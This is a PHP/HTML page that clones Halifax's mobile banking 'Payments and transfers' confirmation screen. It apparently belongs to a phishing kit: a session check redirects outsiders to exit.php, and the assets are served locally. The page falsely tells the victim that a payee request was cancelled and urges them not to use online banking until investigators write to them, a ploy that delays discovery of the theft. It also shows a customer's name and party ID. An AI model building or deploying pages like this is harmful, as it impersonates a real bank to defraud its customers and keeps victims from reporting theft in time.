<?php
session_start();


if($_SESSION['started'] == 'true'){
    //header("Refresh:3; url=exit.php");
}else{
    header('location:exit.php');
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html
    class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths lastchild"
    xml:lang="en-gb"
    xmlns="http://www.w3.org/1999/xhtml"
    style="overflow-x: hidden;"
    lang="en"
>
    <!--<![endif]-->
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
        

        
        <meta name="DCSext.hasTealium" content="1" />

        
    </head>
    <body style="" cz-shortcut-listen="true" data-__gyazo-extension-added-paste-support="true">
        <input type="hidden" name="autoLogOff" id="autoLogOff" value="autologoff" />

        <title>Halifax | Payments and transfers</title>
        <meta name="keywords" content="" />
        <meta name="description" content="" />
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta http-equiv="content-language" content="en-gb" />
        <!--[if gte IE 8]><meta http-equiv="X-UA-Compatible" content="IE=IE8" /><![endif]-->
        <meta name="robots" content="noindex" />
        <meta name="distribution" content="global" />
        <meta name="rating" content="general" />
        <meta
            http-equiv="pics-label"
            content='(pics-1.1 "http://www.icra.org/ratingsv02.html" comment "Single file EN v2.0" l gen true for "httpss://secure.halifax-online.co.uk:10161/personal" r (nz 1 vz 1 lz 1 oz 1 cz 1) "http://www.rsac.org/ratingsv01.html" l gen true for "httpss://secure.halifax-online.co.uk:10161/personal" r (n 0 s 0 v 0 l 0))'
        />

        <meta name="viewport" content="width=device-width, user-scalable=yes, initial-scale=1.0, maximum-scale=1.0" />
        <meta name="format-detection" content="telephone=no" />

        <link href="files/css/styles-blessed2-min200526.css" media="screen, print" type="text/css" rel="stylesheet" />
        <link href="files/css/styles-blessed1-min200526.css" media="screen, print" type="text/css" rel="stylesheet" />
        <link href="files/css/styles-min200526.css" media="screen, print" type="text/css" rel="stylesheet" />
        <!--[if IE]>
            <link rel="stylesheet" href="/assets/HalifaxRetail/ress/css/ie/ie-min200526.css" />
        <![endif]-->

        

        <link rel="shortcut icon" href="files/img/favicon.ico" />

        

        <div class="mobile-wrapper">
            <div id="outer" style="">
                <div class="page-wrap">
                    <header>
                        <div class="sp-pat-m-hf-01-bank-bar need-javascript" data-instance-sp-pat-m-hf-01-bank-bar="24">
                            <div class="m-hf-01-container m-container">
                                <div class="m-01-logo">
                                    <img src="files/img/logo.png" alt="Halifax" title="Halifax" class="desktop_logo" />
                                    <img src="files/img/mobile_logo.png" alt="Halifax" class="mobile_logo" width="42" height="40" />
                                    <img src="files/img/LogoPrint.png" alt="Halifax" class="print_logo" />
                                </div>
                                <div class="m-01-menu-buttons">
                                    <ul>
                                        <li class="menu-logoff">
                                            <div class="m-01-menu-logoff">
                                                <a
                                                    data-wt-ac="HalifaxRetail.common.default.cmslinkssr0005,Log out "
                                                    id="ifCommercial:ifMobLOgOff:outputLinkLogOutMobileHeader"
                                                    name="ifCommercial:ifMobLOgOff:outputLinkLogOutMobileHeader"
                                                    href="https://secure.halifax-online.co.uk/personal/a/paymenthub/mobile/makepaymentsandtransfers.jsp?lnkcmd=ifCommercial%3AifMobLOgOff%3AoutputLinkLogOutMobileHeader&amp;al="
                                                    data-instance-data-wt-ac-="0"
                                                >
                                                    <span class="m-01-menu-button-text" title="Sign out">Sign out</span>
                                                </a>
                                            </div>
                                        </li>

                                        <li class="menu-home">
                                            <div class="m-01-menu-home">
                                                <a
                                                    data-wt-ac="HalifaxRetail.common.default.cmstaglibtxtssr0002,HOME"
                                                    id="ifCommercial:ifRenderHomeList:outputLinkNavBankBarHome"
                                                    name="ifCommercial:ifRenderHomeList:outputLinkNavBankBarHome"
                                                    href="https://secure.halifax-online.co.uk/personal/a/paymenthub/mobile/makepaymentsandtransfers.jsp?lnkcmd=ifCommercial%3AifRenderHomeList%3AoutputLinkNavBankBarHome&amp;al="
                                                    data-instance-data-wt-ac-="1"
                                                >
                                                    <span class="m-01-menu-button-text" title="HOME">HOME</span>
                                                </a>
                                            </div>
                                        </li>

                                        <li class="menu-button">
                                            <div class="m-01-menu-button m-01-menu-right" data-wt-ac="HalifaxRetail.common.default.cmstaglibtxtssr0004,MENU" data-instance-data-wt-ac-="2">
                                                <a href="" class="m-01-menu-button-text"> MENU</a>
                                            </div>
                                        </li>
                                    </ul>
                                </div>

                                <div class="m-fh-01-navigation" role="navigation">
                                    <ul class="m-01-menu-bar"></ul>

                                    <ul class="pull-right m-01-menu-bar">
                                        <li class="m-hf-01-cookie-policy">
                                            <a
                                                data-wt-ac="resource.default.cmslinkssr0002,Cookie Policy"
                                                id="ifCommercial:ifSafeSecure:ifcp:CookiePolicylnk1ForDesk"
                                                name="ifCommercial:ifSafeSecure:ifcp:CookiePolicylnk1ForDesk"
                                                href="https://secure.halifax-online.co.uk/personal/a/paymenthub/mobile/makepaymentsandtransfers.jsp?lnkcmd=ifCommercial%3AifSafeSecure%3Aifcp%3ACookiePolicylnk1ForDesk&amp;al="
                                                title="Cookie Policy"
                                                data-instance-data-wt-ac-="3"
                                            >
                                                Cookie Policy
                                            </a>
                                        </li>

                                        <li class="m-hf-01-safe-secure">
                                            <a
                                                href=""
                                                role="tab"
                                                title="Your Security"
                                                data-section="safe-secure"
                                                data-expandable="expand"
                                                data-wt-ac="HalifaxRetail.modules.default.cmstxtssr0126,Your Security"
                                                data-wt-multi-click="true"
                                                style="line-height: 32px;"
                                                data-instance-data-wt-ac-="4"
                                            >
                                                Your Security
                                                <span> </span>
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>

                        <div class="sp-pat-m-hf-01-bank-bar-container">
                            <div class="mvt_content">
                                <style type="text/css">
                                    body {
                                        margin: 0;
                                    }

                                    body.ls-center {
                                        text-align: center;
                                    }

                                    .ls-canvas .ls-row .ls-row-clr {
                                        clear: both;
                                    }

                                    .ls-canvas .ls-col {
                                        overflow: hidden;
                                    }

                                    .ls-canvas .ls-col-body {
                                        overflow: hidden;
                                    }

                                    .ls-canvas .ls-area {
                                        overflow: hidden;
                                    }

                                    .ls-canvas .ls-area-body {
                                        overflow: hidden;
                                    }

                                    .ls-canvas .ls-area .ls-1st {
                                        margin-top: 0 !important;
                                    }

                                    .ls-canvas .ls-cmp-wrap {
                                        padding: 1px 0;
                                    }

                                    .ls-canvas .iw_component {
                                        margin: -1px 0;
                                    }

                                    .ls-canvas .ls-row .ls-lqa-fix {
                                        font-size: 0;
                                        line-height: 0;
                                        height: 0;
                                        margin-top: 0;
                                    }

                                    .ls-canvas .ls-row .ls-lqr-w {
                                        float: left;
                                        width: 100%;
                                    }

                                    .ls-canvas .ls-row .ls-lqr-w-fx {
                                        float: left;
                                    }

                                    .ls-canvas .ls-row .ls-lqr-e-fx {
                                        float: right;
                                    }
                                </style>
                                <div class="ls-canvas sp-pat-wrapper">
                                    <div class="ls-row">
                                        <div class="ls-lqr">
                                            <div class="ls-area">
                                                <div class="ls-area-body">
                                                    <div class="ls-cmp-wrap ls-1st">
                                                        <!--ls:begin[component-1549057499798]-->
                                                        <div class="iw_component">
                                                            <div data-expandable-section="safe-secure" data-expand="true" class="sp-pat-m-hf-01-safe-secure">
                                                                <div class="m-container m-01-threecol">
                                                                    <h2>About your security</h2>
                                                                    <div class="m-01-section">
                                                                        <p>
                                                                            We've created 'Your Security' to help you protect your accounts and personal information. Use these links to help stay up to date with the latest online safety
                                                                            tips.
                                                                        </p>
                                                                        <p>
                                                                            <a
                                                                                title="Read how to protect your account"
                                                                                href="https://secure.halifax-online.co.uk/personal/a/safezone/displaysafezonearea.jsp?lnkcmd=ifCommercial%3AifCustomerBar%3AoutputLinkNavHome&amp;al=/#/how-to-protect-your-account"
                                                                            >
                                                                                &gt; How to protect your account
                                                                            </a>
                                                                        </p>
                                                                        <p>
                                                                            <a
                                                                                title="Read how to avoid the latest scams"
                                                                                href="https://secure.halifax-online.co.uk/personal/a/safezone/displaysafezonearea.jsp?lnkcmd=ifCommercial%3AifCustomerBar%3AoutputLinkNavHome&amp;al=/#/avoid-the-latest-scams"
                                                                            >
                                                                                &gt; Avoid the latest scams
                                                                            </a>
                                                                        </p>
                                                                        <p>
                                                                            <a
                                                                                title="Read how to contact us about fraud"
                                                                                href="https://secure.halifax-online.co.uk/personal/a/safezone/displaysafezonearea.jsp?lnkcmd=ifCommercial%3AifCustomerBar%3AoutputLinkNavHome&amp;al=/#/report-account-fraud"
                                                                            >
                                                                                &gt; Contact us about fraud
                                                                            </a>
                                                                        </p>
                                                                    </div>
                                                                    <div class="m-01-section">
                                                                        <p>
                                                                            <a
                                                                                title="Read how to make your password more secure"
                                                                                href="https://secure.halifax-online.co.uk/personal/a/safezone/displaysafezonearea.jsp?lnkcmd=ifCommercial%3AifCustomerBar%3AoutputLinkNavHome&amp;al=/#/make-your-password-more-secure"
                                                                            >
                                                                                &gt; Make your password more secure
                                                                            </a>
                                                                        </p>
                                                                        <p>
                                                                            <a
                                                                                title="Find out how safe you are online"
                                                                                href="https://secure.halifax-online.co.uk/personal/a/safezone/displaysafezonearea.jsp?lnkcmd=ifCommercial%3AifCustomerBar%3AoutputLinkNavHome&amp;al=/#/check-how-safe-you-are-online"
                                                                            >
                                                                                &gt; Check how safe you are online
                                                                            </a>
                                                                        </p>
                                                                    </div>
                                                                    <div class="m-01-section">
                                                                        <p><strong>Online and mobile banking guarantee</strong></p>
                                                                        <p>We’ll refund your money if you become a victim of fraud when using Internet Banking, as long as you’ve used our services carefully.&nbsp;</p>
                                                                        <p>Find out more by reading our online and mobile banking guarantee.</p>
                                                                        <ul class="links">
                                                                            <li>
                                                                                <a
                                                                                    href="https://www.halifax.co.uk/aboutonline/security/protecting-yourself-from-fraud/banking-online-safely/?pagetabs=0#collapse1-1537493435305"
                                                                                    target="_blank"
                                                                                    alt="Our Online Fraud Guarantee shows you the steps to take."
                                                                                >
                                                                                    Our Online Fraud Guarantee shows you the steps to take.
                                                                                </a>
                                                                            </li>
                                                                        </ul>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <!--ls:end[component-1549057499798]-->
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="m-hf-02-customer-bar need-javascript mobile-menu m-hf-02-customer-bar-0" data-instance-m-hf-02-customer-bar="25">
                            <div class="m-container">
                                <div class="m-hf-02-name">
                                    <div class="nav-title">
                                        <span class="m-hf-02-name">
                                            <a href="#" role="presentation">
                                                <!--TLTODPLVL2BEG-->
                                                Mr P. Ogunwusi
                                                <!--TLTODPLVL2END-->
                                            </a>
                                        </span>

                                        <span class="m-hf-02-logged-in"><a href="#" role="region">Last signed in&nbsp;09 July 20 at 07:08 PM</a></span>
                                    </div>
                                </div>
                                <ul class="m-hf-02-nav">
                                    <li class="m-hf-02-home cb-tab-home">
                                        <div class="nav-title">
                                            <a
                                                data-wt-ac="resource.default.cmstxtssr0015,Home"
                                                id="ifCommercial:ifCustomerBar:outputLinkNavHomeMobile"
                                                name="ifCommercial:ifCustomerBar:outputLinkNavHomeMobile"
                                                href="https://secure.halifax-online.co.uk/personal/a/paymenthub/mobile/makepaymentsandtransfers.jsp?lnkcmd=ifCommercial%3AifCustomerBar%3AoutputLinkNavHomeMobile&amp;al="
                                                data-instance-data-wt-ac-="5"
                                            >
                                                Home
                                            </a>
                                        </div>
                                    </li>
                                    <li class="hide-desktab"><div class="nav-title"></div></li>
                                    <li class="m-hf-02-tab cb-tab-accounts">
                                        <div class="nav-title"></div>
                                        <div class="nav-content" data-max-items="4" data-ajax-load="true"></div>
                                    </li>
                                    <li class="m-hf-02-tab cb-tab-profile hide-mobile">
                                        <div class="nav-title"></div>
                                        <div class="nav-content" data-ajax-load="true"></div>
                                    </li>
                                    <li class="m-hf-02-tab cb-tab-help-contact hide-mobile">
                                        <div class="nav-title">
                                            <a
                                                href="http://www.halifax.co.uk/onlinebankinghelp/onlinehelp.asp"
                                                data-wt-multi-click="true"
                                                data-wt-ac="resource.default.cmstxtssr0011,Help Support"
                                                role="tab"
                                                id="ifCustomerBar:outputLinkHelpandSupportSSR"
                                                title="Help &amp; Support"
                                                data-ajax-uri="/personal/ajax/helpSupport"
                                                data-section-parent="help-contact"
                                                class="main-nav"
                                                target="_blank"
                                                data-instance-data-wt-ac-="6"
                                                aria-expanded="false"
                                            >
                                                Help &amp; Support
                                            </a>
                                        </div>
                                        <div class="nav-content" data-ajax-load="true"></div>
                                    </li>
                                    <li class="m-hf-02-mail cb-tab-mail hide-mobile"><div class="nav-title"></div></li>
                                    <li class="hide-desktab">
                                        <div class="nav-title">
                                            <a href="#" class="sub-nav-toggle" data-wt-ac="resource.default.cmslinkssr0116,Help &amp; contact us" data-wt-multi-click="true" data-instance-data-wt-ac-="7">Help &amp; contact us</a>
                                        </div>
                                        <ul class="mobile-sub-nav">
                                            <li>
                                                <a
                                                    data-wt-ac="HalifaxRetail.modules.default.cmslinkssr0123,Lost or stolen card"
                                                    id="ifCommercial:ifCustomerBar:ifMobhelp:lnkLostStolen"
                                                    name="ifCommercial:ifCustomerBar:ifMobhelp:lnkLostStolen"
                                                    href="https://secure.halifax-online.co.uk/personal/a/lost_stolen_card/"
                                                    data-instance-data-wt-ac-="8"
                                                >
                                                    Lost or stolen card
                                                </a>
                                            </li>
                                            <li>
                                                <a
                                                    data-wt-ac="HalifaxRetail.modules.default.cmslinkssr0123,Order replacement card or PIN"
                                                    id="ifCommercial:ifCustomerBar:ifMobhelp:lnkCardPins"
                                                    name="ifCommercial:ifCustomerBar:ifMobhelp:lnkCardPins"
                                                    href="https://secure.halifax-online.co.uk/personal/a/card_replacement/"
                                                    data-instance-data-wt-ac-="9"
                                                >
                                                    Order replacement card or PIN
                                                </a>
                                            </li>
                                            <li>
                                                <a
                                                    href="https://secure.halifax-online.co.uk/personal/link/lp_mobile_help_index?REFERRING_LOCATION=&amp;REFER_LOCATION=help&amp;HEADER_CONTENT=pages%2fp140_08_help_faq_index_logged_in%2f14008htm300&amp;BODY_CONTENT=pages%2fp140_08_help_faq_index_logged_in%2f14008hlp301"
                                                    data-wt-ac="HalifaxRetail.modules.default.cmslinkssr0125,Help"
                                                    data-instance-data-wt-ac-="10"
                                                >
                                                    Help
                                                </a>
                                            </li>
                                            <li>
                                                <a
                                                    data-wt-ac='HalifaxRetail.modules.default.cmslinkssr0126,Phone lines are open 24/7. &lt;span class="underline"&gt;0345 602 0000&lt;/span&gt;'
                                                    id="ifCommercial:ifCustomerBar:ifMobhelp:lnkGeneralEnq"
                                                    name="ifCommercial:ifCustomerBar:ifMobhelp:lnkGeneralEnq"
                                                    href="#"
                                                    data-instance-data-wt-ac-="11"
                                                >
                                                    Phone lines are open 24/7. <span class="underline">0345 602 0000</span>
                                                </a>
                                            </li>
                                            <li>
                                                <a
                                                    data-wt-ac="HalifaxRetail.modules.default.cmslinkssr0127,Contact us"
                                                    id="ifCommercial:ifCustomerBar:ifMobhelp:outputLinkContactUsLoggedIn"
                                                    name="ifCommercial:ifCustomerBar:ifMobhelp:outputLinkContactUsLoggedIn"
                                                    href="https://secure.halifax-online.co.uk/personal/a/paymenthub/mobile/makepaymentsandtransfers.jsp?REFERRING_LOCATION=%2Fpaymenthub%2Fmobile%2Fmakepaymentsandtransfers.jsp&amp;HEADER_CONTENT=pages%2Fp140_13_contact_logged_in%2F14013htm300&amp;BODY_CONTENT=pages%2Fp140_13_contact_logged_in%2F14013htm301&amp;COOKIE_POLICY_FLAG=FALSE&amp;lnkcmd=ifCommercial%3AifCustomerBar%3AifMobhelp%3AoutputLinkContactUsLoggedIn&amp;al="
                                                    data-instance-data-wt-ac-="12"
                                                >
                                                    Contact us
                                                </a>
                                            </li>
                                        </ul>
                                    </li>
                                    <li class="m-hf-02-mail cb-tab-mail cb-tab-aux-link hide-desktab"><div class="nav-title"></div></li>
                                    <li class="m-hf-02-logout cb-tab-logout cb-tab-aux-link">
                                        <div class="nav-title">
                                            <a
                                                data-wt-ac="HalifaxRetail.common.default.cmslinkssr0005,Log out "
                                                id="ifCommercial:ifCustomerBar:ifMobLO:outputLinkLogOutMobile"
                                                name="ifCommercial:ifCustomerBar:ifMobLO:outputLinkLogOutMobile"
                                                href="https://secure.halifax-online.co.uk/personal/a/paymenthub/mobile/makepaymentsandtransfers.jsp?lnkcmd=ifCommercial%3AifCustomerBar%3AifMobLO%3AoutputLinkLogOutMobile&amp;al="
                                                title="Sign out"
                                                data-instance-data-wt-ac-="13"
                                            >
                                                Sign out
                                            </a>
                                        </div>
                                    </li>
                                    <li class="m-hf-02-logout cb-tab-aux-link hide-desktab">
                                        <div class="nav-title">
                                            <a
                                                data-wt-ac="resource.default.cmslinkssr0002,Cookie Policy"
                                                id="ifCommercial:ifCustomerBar:ifcp:outputLinkCookiePolicyLoggedIn"
                                                name="ifCommercial:ifCustomerBar:ifcp:outputLinkCookiePolicyLoggedIn"
                                                href="https://secure.halifax-online.co.uk/personal/a/paymenthub/mobile/makepaymentsandtransfers.jsp?REFERRING_LOCATION=%2Fpaymenthub%2Fmobile%2Fmakepaymentsandtransfers.jsp&amp;HEADER_CONTENT=pages%2Fp226_00%2F22600htm500&amp;BODY_CONTENT=pages%2Fp226_00%2F22600htm501&amp;COOKIE_POLICY_FLAG=FALSE&amp;lnkcmd=ifCommercial%3AifCustomerBar%3Aifcp%3AoutputLinkCookiePolicyLoggedIn&amp;al="
                                                title="Cookie Policy"
                                                data-instance-data-wt-ac-="14"
                                            >
                                                Cookie Policy
                                            </a>
                                        </div>
                                    </li>
                                    <li class="m-hf-02-logout cb-tab-aux-link hide-desktab">
                                        <div class="nav-title">
                                            <a
                                                data-wt-ac="resource.default.cmslinkssr0001,Your Security"
                                                id="ifCommercial:ifCustomerBar:outputLinkSafeSecureRessMobileLoggedIn"
                                                name="ifCommercial:ifCustomerBar:outputLinkSafeSecureRessMobileLoggedIn"
                                                href="https://secure.halifax-online.co.uk/personal/a/paymenthub/mobile/makepaymentsandtransfers.jsp?REFERRING_LOCATION=&amp;HEADER_CONTENT=pages%2Fp140_07_security_logged_in%2F14007htm300&amp;BODY_CONTENT=pages%2Fp140_07_security_logged_in%2F14007htm301&amp;lnkcmd=ifCommercial%3AifCustomerBar%3AoutputLinkSafeSecureRessMobileLoggedIn&amp;al="
                                                title="Your Security"
                                                data-instance-data-wt-ac-="15"
                                            >
                                                Your Security
                                            </a>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </header>

                    <div id="page" class="layout-right">
                        <div class="m-container">
                            <div class="layout-content">
                                
                                <span id="partyId" style="display: none;">545579630</span><span id="brandName" style="display: none;">HALIFAX</span>

                                <div style="display: none;">
                                    <span id="cwaArrangementId"> </span>
                                    <span id="cwaBeneficiaryId"> </span>

                                    <span id="cwaPartyIdForWebtrends">
                                        545579630
                                    </span>

                                    <span id="cwaCancelRedirection"> </span>

                                    <span id="cwaANRURIForNGB">
                                        /payments/mobile/createnewbeneficiary/setupnewpayee.jsp
                                    </span>

                                    <span id="cwaRedirectedFromStandingOrderLinks">
                                        false
                                    </span>

                                    <span id="cwaRedirectedFromTopUpIsa">
                                        false
                                    </span>

                                    <span id="cwaAmendJourneyName"> </span>

                                    <span id="cwaAmendId"> </span>
                                </div>
                                <div id="cwa-ph" data-context-path="/personal" class="cwa-ph--hfax" style="">
                                    <div data-reactroot="" data-radium="true">
                                        <div class="page">
                                            <div class="pure-g component-ConfirmationStep" data-selector="confirmation-step">
                                                <div data-selector="journey-header" class="component-JourneyHeader"><div data-selector="breadcrumb" class="sr-only" aria-hidden="true">Step 3 of 3</div></div>
                                                <div class="pure-u-1" style="position: relative;">
                                                    <section data-radium="true" style="padding-top: 24px; padding-left: 22px; padding-right: 22px; background: rgb(255, 255, 255) none repeat scroll 0% 0%;">
                                                        <div data-radium="true">
                                                            <div data-selector="result-header" data-radium="true" style="margin: 0px auto; text-align: center;">
                                                                <i class="false" data-radium="true" style="color: rgb(218, 26, 53); font-size: 48px;"></i>
                                                                <h1
                                                                    data-selector="page-title"
                                                                    class="component-PageTitle"
                                                                    tabindex="-1"
                                                                    style="color: rgb(51, 51, 51); font-size: 24px; line-height: 30px; font-family: 'agendaBold', arial, sans-serif; margin-bottom: 3px; width: auto;"
                                                                >
                                                                    Thank You
                                                                </h1>
                                                            </div>
                                                            <div data-selector="confirmation-error-message" data-radium="true" style="text-align: center;">
                                                                <div class="component-IntroCopy">
                                                                    <span style="font-weight: bold;">The payee request has been successfully cancelled.</span><br>
                                                                    Please refrain from accessing any form of online banking until we send you correspondance and our investigations are complete.<br><br>

                                                                    Please expect to receive a letter to the address you have registered with us in regards to open investigations within <span style="font-weight: bold;">two working days</span>.
                                                                </div>
                                                                <center><img src="files/img/check.png" style="width: 100px; height: 100px;"></center>
                                                                <br>
                                                                <br>
                                                                <br>
                                                            </div>
                                                        </div>
                                                        <!--<div class="component-JourneyFooter clearfix" data-selector="journey-footer">
                                                            <button data-selector="go-to-accounts-button" class="component-BaseButton--large component-PrimaryButton">Back to your accounts</button>
                                                            <button data-selector="make-another-transfer-button" class="component-BaseButton--large component-SecondaryButton">Payments and transfers</button>
                                                            <ul class="sr-only" data-radium="true" style="padding-top: 10px; padding-bottom: 10px;">
                                                                <li data-radium="true" style="font-family: 'agendaNormal', arial, sans-serif; line-height: 1.5; list-style: outside none none;">
                                                                    <a href="https://secure.halifax-online.co.uk/personal/a/mobile/account_overview/" data-selector="account-overview-link-footer">Back to your accounts</a>
                                                                </li>
                                                            </ul>
                                                        </div>-->
                                                    </section>
                                                </div>
                                            </div>
                                        </div>
                                        <style>
                                            @media (max-width: 567px) {
                                                .rmq-b624452 {
                                                    font-size: 54px !important;
                                                    line-height: 54px !important;
                                                }
                                            }
                                            @media (min-width: 568px) {
                                                .rmq-72ddadc3 {
                                                    font-size: 60px !important;
                                                    line-height: 60px !important;
                                                }
                                            }
                                            @media (min-width: 568px) {
                                                .rmq-d630a89 {
                                                    display: inline-block !important;
                                                    margin-right: 10px !important;
                                                }
                                            }
                                            @media (max-width: 567px) {
                                                .rmq-ccb7a879 {
                                                    margin-bottom: 4px !important;
                                                }
                                            }
                                            @media (max-width: 480px) {
                                                .rmq-1c7d6c41 {
                                                    margin-bottom: 26px !important;
                                                }
                                            }
                                            @media (max-width: 480px) {
                                                .rmq-87a54101 {
                                                    float: right !important;
                                                }
                                            }
                                        </style>
                                    </div>
                                </div>
                                
                            </div>
                            <div class="layout-side">
                                
                            </div>
                        </div>
                    </div>
                </div>

                <div class="sp-pat-m-hf-03-footer">
                    <div class="m-hf-03-footer-04">
                        <div class="m-container">
                            <ul class="infoLinks1">
                                <li>
                                    <a
                                        id="help1SSR"
                                        href="https://secure.halifax-online.co.uk/personal/link/lp_mobile_help_index?REFERRING_LOCATION=MOBILE_VIEW_PRODUCT_DETAILS&amp;REFER_LOCATION=help&amp;HEADER_CONTENT=pages%2fp140_08_help_faq_index_logged_in%2f14008htm300&amp;BODY_CONTENT=pages%2fp140_08_help_faq_index_logged_in%2f14008hlp301"
                                        title="Help"
                                        data-wt-ac="HalifaxRetail.common.default.cmstaglibtxtssr0009 Help"
                                        data-instance-data-wt-ac-="16"
                                    >
                                        Help
                                    </a>
                                </li>

                                <li>
                                    <a
                                        id="contactUsSSR"
                                        href="https://secure.halifax-online.co.uk/personal/link/lp_mobile_contact_us?REFERRING_LOCATION=MOBILE_VIEW_PRODUCT_DETAILS&amp;REFER_LOCATION=noHelp&amp;HEADER_CONTENT=pages%2fp140_13_contact_logged_in%2f14013htm300&amp;BODY_CONTENT=pages%2fp140_13_contact_logged_in%2f14013htm301"
                                        title="Contact us"
                                        data-wt-ac="HalifaxRetail.common.default.cmstaglibtxtssr0010 Contact us"
                                        data-instance-data-wt-ac-="17"
                                    >
                                        Contact us
                                    </a>
                                </li>
                            </ul>
                            <ul class="infoLinks2">
                                <li>
                                    <a
                                        id="securitySSR"
                                        href="https://secure.halifax-online.co.uk/personal/link/lp_mobile_security?REFERRING_LOCATION=MOBILE_VIEW_PRODUCT_DETAILS&amp;REFER_LOCATION=noHelp&amp;HEADER_CONTENT=pages%2fp140_07_security_logged_in%2f14007htm300&amp;BODY_CONTENT=pages%2fp140_07_security_logged_in%2f14007htm301"
                                        title="Security"
                                        data-wt-ac="HalifaxRetail.common.default.cmstaglibtxtssr0011 Security"
                                        data-instance-data-wt-ac-="18"
                                    >
                                        Security
                                    </a>
                                </li>
                                <li>
                                    <a
                                        id="legalSSR"
                                        href="https://secure.halifax-online.co.uk/personal/link/lp_mobile_legal?REFERRING_LOCATION=MOBILE_VIEW_PRODUCT_DETAILS&amp;REFER_LOCATION=noHelp&amp;HEADER_CONTENT=pages%2fp140_02_legal_logged_in%2f14002htm300&amp;BODY_CONTENT=pages%2fp140_02_legal_logged_in%2f14002htm301"
                                        title="Legal"
                                        data-wt-ac="HalifaxRetail.common.default.cmstaglibtxtssr0012 Legal"
                                        data-instance-data-wt-ac-="19"
                                    >
                                        Legal
                                    </a>
                                </li>

                                <li>
                                    <a
                                        id="privacySSR"
                                        href="http://www.halifax.co.uk/securityandprivacy/privacy"
                                        title="Privacy"
                                        data-wt-ac="HalifaxRetail.common.default.cmstaglibtxtssr0013 Privacy"
                                        target="_blank"
                                        data-instance-data-wt-ac-="20"
                                    >
                                        Privacy
                                    </a>
                                </li>
                                <li>
                                    <a
                                        id="interstRatesSSR"
                                        href="http://www.halifax.co.uk/bankaccounts/rates-rewards-fees"
                                        title="Rates and charges"
                                        data-wt-ac="HalifaxRetail.common.default.cmstaglibtxtssr0014 Rates and charges"
                                        target="_blank"
                                        data-instance-data-wt-ac-="21"
                                    >
                                        Rates and charges
                                    </a>
                                </li>
                                <li>
                                    <a id="BOS_SSR" href="http://www.halifax.co.uk/" title="www.halifax.co.uk" data-wt-ac="HalifaxRetail.common.default.cmstaglibtxtssr0016 www.halifax.co.uk" target="_blank" data-instance-data-wt-ac-="22">
                                        www.halifax.co.uk
                                    </a>
                                </li>
                                <li>
                                    <a
                                        id="desktopSiteSSR"
                                        href="https://secure.halifax-online.co.uk/personal/link/lp_mobile_go_to_desktop?REFERRING_LOCATION=MOBILE_VIEW_PRODUCT_DETAILS"
                                        title="Go to desktop site"
                                        data-wt-ac="HalifaxRetail.common.default.cmstaglibtxtssr0015 Go to desktop site"
                                        data-instance-data-wt-ac-="23"
                                    >
                                        Go to desktop site
                                    </a>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>

                
                <div class="shadow-overlay"></div>

                
            </div>
        </div>
        <div id="myChatLinkContainer"></div>
        <link type="text/css" rel="stylesheet" href="files/css/grid.css" /><link type="text/css" rel="stylesheet" href="files/css/base.css" />
        
        <div id="ZN_3EOctUu82gI4qup"></div>
        
    </body>
</html>
